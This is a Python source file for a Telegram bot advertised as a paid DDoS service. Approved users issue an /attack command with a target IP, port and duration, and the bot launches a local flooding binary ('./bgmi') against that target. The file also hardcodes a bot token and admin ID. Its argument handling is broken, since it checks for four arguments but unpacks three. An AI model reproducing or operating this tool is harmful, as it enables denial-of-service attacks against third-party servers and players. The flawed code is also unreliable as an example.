import asyncio
import time
from telegram import Update
from telegram.ext import Application, CommandHandler, CallbackContext

TELEGRAM_BOT_TOKEN = '7819992909:AAHn51FAfPId42gmKUT5wPmCoyC4_g9OeN0'
ADMIN_USER_ID = 1662672529
APPROVED_IDS_FILE = 'approved_ids.txt'
attack_in_progress = False
user_cooldowns = {}  # Tracks cooldowns for users
COOLDOWN_PERIOD = 120  # Cooldown in seconds (e.g., 1 minute)
MAX_ATTACK_DURATION = 250  # Maximum allowed attack duration in seconds

# Load approved IDs (users and groups) from file
def load_approved_ids():
    try:
        with open(APPROVED_IDS_FILE) as f:
            return set(line.strip() for line in f)
    except FileNotFoundError:
        return set()

def save_approved_ids(approved_ids):
    with open(APPROVED_IDS_FILE, 'w') as f:
        f.writelines(f"{id_}\n" for id_ in approved_ids)

approved_ids = load_approved_ids()

# Start command
async def start(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    message = (
        "*𝐖𝐄𝐋𝐂𝐎𝐌𝐄 𝐓𝐎 𝐆𝐎𝐃x𝐂𝐇𝐄𝐀𝐓𝐒 𝐃𝐃𝐎𝐒  *\n\n"
        "*PRIMIUM DDOS BOT*\n"
        "*OWNERS :- @RajOwner90 @GODxAloneBOY*\n"
    )
    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')

# Approve command
async def approve(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    args = context.args

    if chat_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ You need admin permission to use this command.*", parse_mode='Markdown')
        return

    if len(args) != 1:
        await context.bot.send_message(chat_id=chat_id, text="* Usage » /approve id (user or group chat ID)*", parse_mode='Markdown')
        return

    target_id = args[0].strip()
    approved_ids.add(target_id)
    save_approved_ids(approved_ids)
    await context.bot.send_message(chat_id=chat_id, text=f"*✅ ID {target_id} approved.*", parse_mode='Markdown')

# Remove command
async def remove(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    args = context.args

    if chat_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ You need admin permission to use this command.*", parse_mode='Markdown')
        return

    if len(args) != 1:
        await context.bot.send_message(chat_id=chat_id, text="* Usage » /remove id (user or group chat ID)*", parse_mode='Markdown')
        return

    target_id = args[0].strip()
    if target_id in approved_ids:
        approved_ids.discard(target_id)
        save_approved_ids(approved_ids)
        await context.bot.send_message(chat_id=chat_id, text=f"*✅ ID {target_id} removed.*", parse_mode='Markdown')
    else:
        await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ ID {target_id} is not approved.*", parse_mode='Markdown')

# Check command
async def check(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id

    if chat_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ You need admin permission to use this command.*", parse_mode='Markdown')
        return

    if not approved_ids:
        await context.bot.send_message(chat_id=chat_id, text="*No users or groups approved yet.*", parse_mode='Markdown')
        return

    message = "*Approved Users and Groups:*\n" + "\n".join(f"- {id_}" for id_ in approved_ids)
    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')

# Attack command
async def attack(update: Update, context: CallbackContext):
    global attack_in_progress

    chat_id = update.effective_chat.id
    user_id = str(update.effective_user.id)
    args = context.args
    current_time = time.time()

    if str(chat_id) not in approved_ids and user_id not in approved_ids:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ You need permission to use this bot.*", parse_mode='Markdown')
        return

    # Cooldown check
    if user_id in user_cooldowns:
        last_used_time = user_cooldowns[user_id]
        if current_time - last_used_time < COOLDOWN_PERIOD:
            remaining_time = int(COOLDOWN_PERIOD - (current_time - last_used_time))
            await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ Please wait {remaining_time} seconds before using the attack command again.*", parse_mode='Markdown')
            return

    if attack_in_progress:
        await context.bot.send_message(chat_id=chat_id, text="* Please wait 3 to 5 minutes for the next attack.*", parse_mode='Markdown')
        return

    if len(args) != 4:
        await context.bot.send_message(chat_id=chat_id, text="*  example » /attack ip port time*", parse_mode='Markdown')
        return

    ip, port, time_duration = args

    # Restrict attack duration
    try:
        time_duration = int(time_duration)
        if time_duration > MAX_ATTACK_DURATION:
            await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ Maximum attack duration is {MAX_ATTACK_DURATION} seconds.*", parse_mode='Markdown')
            return
    except ValueError:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Invalid time duration. Please use an integer.*", parse_mode='Markdown')
        return

    await context.bot.send_message(chat_id=chat_id, text=(
        f"*✅ 𝐀𝐓𝐓𝐀𝐂𝐊 𝐋𝐀𝐔𝐍𝐂𝐇𝐄𝐃 ✅*\n"
        f"*⭐ Target » {ip}*\n"
        f"*⭐ Port » {port}*\n"
        f"*⭐ Time » {time_duration} seconds*\n"
        f"*🔻🔻🔻🔻🔻🔻🔻🔻🔻🔻🔻🔻*\n"
    ), parse_mode='Markdown')

    # Record the cooldown timestamp
    user_cooldowns[user_id] = current_time

    asyncio.create_task(run_attack(chat_id, ip, port, time_duration, context))

# Run attack function
async def run_attack(chat_id, ip, port, time_duration, context):
    global attack_in_progress
    attack_in_progress = True

    try:
        process = await asyncio.create_subprocess_shell(
            f"./bgmi {ip} {port} {time_duration} 50",
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        stdout, stderr = await process.communicate()

        if stdout:
            print(f"[stdout]\n{stdout.decode()}")
        if stderr:
            print(f"[stderr]\n{stderr.decode()}")

    except Exception as e:
        await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ Error during the attack: {str(e)}*", parse_mode='Markdown')

    finally:
        attack_in_progress = False
        await context.bot.send_message(chat_id=chat_id, text="*✅ 𝐀𝐓𝐓𝐀𝐂𝐊 𝐅𝐈𝐍𝐈𝐒𝐇𝐄𝐃 ✅*\n*SEND FEEDBACK TO OWNERS*\n*@GODxAloneBOY @RajOwner90*", parse_mode='Markdown')

# Main function
def main():
    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("approve", approve))
    application.add_handler(CommandHandler("remove", remove))
    application.add_handler(CommandHandler("check", check))
    application.add_handler(CommandHandler("attack", attack))
    application.run_polling()

if __name__ == '__main__':
    main()
